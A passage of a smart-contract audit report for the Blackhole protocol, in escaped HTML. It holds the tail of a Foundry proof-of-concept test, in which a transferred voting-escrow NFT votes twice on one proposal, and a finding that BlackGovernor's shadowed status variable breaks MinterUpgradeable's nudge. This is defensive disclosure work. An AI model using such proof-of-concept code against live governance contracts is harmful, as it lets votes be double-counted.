class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Against Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagainstVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;For Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Abstain Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabstainVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecastVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e         (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagainstVotes2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforVotes2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabstainVotes2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        )= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Against Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagainstVotes2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;For Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforVotes2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Abstain Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabstainVotes2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-56\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-3\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-66\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-18-status-does-not-update-inside-the-blackgovernor-leading-to-complete-distribution-of-nudge-functionality\" style=\"position:relative;\"\u003e\u003ca href=\"#m-18-status-does-not-update-inside-the-blackgovernor-leading-to-complete-distribution-of-nudge-functionality\" aria-label=\"m 18 status does not update inside the blackgovernor leading to complete distribution of nudge functionality permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-162\"\u003e[M-18] Status does not update inside the \u003ccode\u003eBlackGovernor\u003c/code\u003e leading to complete distribution of nudge functionality\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-416\"\u003ehakunamatata\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-173\"\u003edanzero\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-210\"\u003erashmor\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-199\"\u003ermrf480\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L308-L330\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L308-L330\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-6\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-6\" aria-label=\"finding description and impact 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eMinterUpgradeable\u003c/code\u003e has \u003ccode\u003enudge\u003c/code\u003e function that is called by the \u003ccode\u003eBlackGovernor\u003c/code\u003e contract. The nudge function then check the \u003ccode\u003estatus\u003c/code\u003e of the \u003ccode\u003eBlackGovernor\u003c/code\u003e and based on status, updates the \u003ccode\u003etailEmissionRate\u003c/code\u003e of the contract; however, from analyzing the \u003ccode\u003eBlackGovernor\u003c/code\u003e contract (which means also analyzing contracts inside the \u003ccode\u003eGovernor.sol\u003c/code\u003e ), we can see that the \u003ccode\u003estatus\u003c/code\u003e variable \u003cstrong\u003eDOES NOT CHANGE EVER\u003c/strong\u003e. This leads to the fact that even though proposal has succeeded meaning the \u003ccode\u003etailEmissionRate\u003c/code\u003e should be equal to \u003ccode\u003ePROPOSAL_INCREASE\u003c/code\u003e, it goes to else branch and \u003ccode\u003etailEmissionRate\u003c/code\u003e never changes. \u003c/p\u003e\n\u003cp\u003eThis is because the status variable inside \u003ccode\u003eBlackGovernor/Governor\u003c/code\u003e is SHADOWED in the \u003ccode\u003eexecute\u003c/code\u003e function, which can be easily checked using even Solidity Visual Developer extension.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enudge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_epochGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_gaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_epochGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;NA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e//@audit STATUS NEVER GETS UPDATED !!!\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eIBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_state\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_epochGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTAIL_START\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eactive_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_state\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSucceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etailEmissionRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePROPOSAL_INCREASE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_state\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDefeated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etailEmissionRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePROPOSAL_DECREASE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etailEmissionRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eproposals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexecute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochTimeHash\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan 